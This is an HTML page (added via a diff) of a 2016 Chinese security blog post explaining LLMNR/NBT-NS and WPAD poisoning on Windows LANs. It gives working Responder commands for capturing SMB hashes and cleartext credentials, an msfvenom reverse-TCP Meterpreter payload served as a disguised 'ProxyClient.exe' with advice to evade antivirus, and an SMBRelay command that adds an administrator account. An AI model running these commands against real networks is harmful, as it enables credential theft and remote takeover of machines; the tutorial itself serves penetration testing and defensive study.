@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="利用LLMNR协议进行常规win内网渗透的理解与实践"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>利用LLMNR协议进行常规win内网渗透的理解与实践 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/07/23/llmnr-wpad/">
+                利用LLMNR协议进行常规win内网渗透的理解与实践
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-07-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-directory-pentest/">active directory pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 由LLMNR协议引发的一系列中间人,在开始真正的内容之前,我们需要先来了解下,在同一内网环境下的windows机器之间的一些通信细节,当一台win机器向另一台win机器以域名[其实是机器名] 的形式请求相应的资源时,正常的通信流程如下<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">首先,windows会先去检查自己的主机配置文件[即常说的host文件,通常在C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\d</span>rivers<span class="symbol">\e</span>tc下],然后按照此文件事先配置好的指向进行解析</div><div class="line">当上面的步骤无法正确解析时,此时系统会自动去检查本地的dns缓存,按照缓存中的指向再进行解析,执行 ipconfig /displaydns 即可看到缓存内容</div><div class="line">如果连本地缓存也不能正确解析,它会继续向本地网络中的dns服务器去请求</div><div class="line">最后,如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析</div><div class="line"></div><div class="line">[netbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层]</div></pre></td></tr></table></figure></p>
+<p>0x02 而基于LLMNR的中间人攻击,也就发生在上面流程的最后一步:</p>
+<p>假设现在有三台机器,A[正常的客户机],B[攻击者的机器],C[要访问的服务器],当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码,一次简易的基于LLMNR中间人的攻击就这样被完成了,下面的流程图已经很好的说明了这一攻击过程<br><img src="/img/LLMNRs.png" alt="LLMNR"></p>
+<p>此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RESPONESNDERS_I.png" alt=""><br>在C上,也就是我们的服务器上先创建一个共享目录<br><img src="/img/RESPONES_FTP.png" alt=""></p>
+<p>然后再回到A上通过smb进行访问<br><img src="/img/RESPONESNDERS_hash.png" alt=""></p>
+<p>此时,回到B上我们就轻松截获了A发来的登陆凭证<br><img src="/img/RESPONESNDERS_HSAHS_RE.png" alt=""><br><br></p>
+<p>0x03 说完netbios,我们再来说说WPAD,还是先大致了解下WPAD是个东西<br></p>
+<p>正常情况下,一些公司为了提高网络利用率,尽量减小带宽消耗,在内部一般都会采用代理服务器的方式来上网,这也就意味着公司内部的员工要想上网则需要把自己的系统代理地址设为公司代理服务器的地址,说了一大堆没用的,WPAD又是干什么的呢,说白点主要用它来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理,但如何查找到这个文件的位置呢,一种方式可以通过dns查询,另一种方式是通过dhcp服务进行检索,还有就是利用LLMNR查询,我们确实是可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为’自动检测代理设置’的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器,相信下面的图已经描述的非常清楚了<br><br><img src="/img/WPAD_ATTACK.jpg" alt=""></p>
+<p>利用responders获取内网明文密码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0 -wFb</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RESPONESNDERS_I_2.png" alt=""><br><img src="/img/RESPONESNDERS_clean.png" alt=""><br><img src="/img/RESPONESNDERS_IS.png" alt=""><br><img src="/img/RESPONESNDERS_pass.png" alt=""></p>
+<p>利用responder 在内网中伪造钓鱼页面批量挂后门 [内网社工也许会用得上]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">首先,准备好自己的马,这里我就暂时直接用msf来生成了,实际中,大家尽可能把自己的马伪装的好一点</div><div class="line">免杀是必须的,生成好以后把它放到我们的responder的files目录中</div><div class="line"></div><div class="line"><span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.5  LPORT=1234 -f exe -o /root/Desktop/shell.exe</span></div><div class="line"><span class="comment"># mv /root/Desktop/shell.exe /usr/share/responder/files/</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 编辑responder的主配置文件,开启下面的选项</span></div><div class="line"><span class="comment"># vi Responder.conf</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Serve-Always = On</div><div class="line">Serve-Exe = On </div><div class="line">HtmlFilename = files/AccessDenied.html</div><div class="line">ExeFilename = files/shell.exe     	指定我们刚刚生成的shell名称</div><div class="line">ExeDownloadName = ProxyClient.exe 	提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字</div><div class="line"><span class="string">`</span></div></pre></td></tr></table></figure>
+<p><img src="/img/RESPONESNDERS_HSAHS_backdoor.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0 -wrf</span></div></pre></td></tr></table></figure>
+<p><img src="/img/RESPONESNDERS_HSAHS_shells.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_exec.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_send_shell.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_backdoor_exec.png" alt=""><br></p>
+<p>利用responder进行smbrelay攻击 [后面可以连续提供多个用户名进行尝试,记得用空格分开即可]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#./SMBRelay.py -t 192.168.3.251 -c "net user vuln pass /ADD &amp;&amp; net localgroup administrators vuln /add" -t 192.168.3.5 -u Administrator</span></div></pre></td></tr></table></figure></p>
+<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;相对于各类传统的中间人,类似的攻击,成功率相对来说可能会更高,关于responder的用法,这里只简单列举了一部分,观察到最新版的里面又加了很多貌似很好用的功能,抽空再续吧,另外,也期待大家能一起积极深入交流讨论<br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/active-pentest/">#active pentest</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
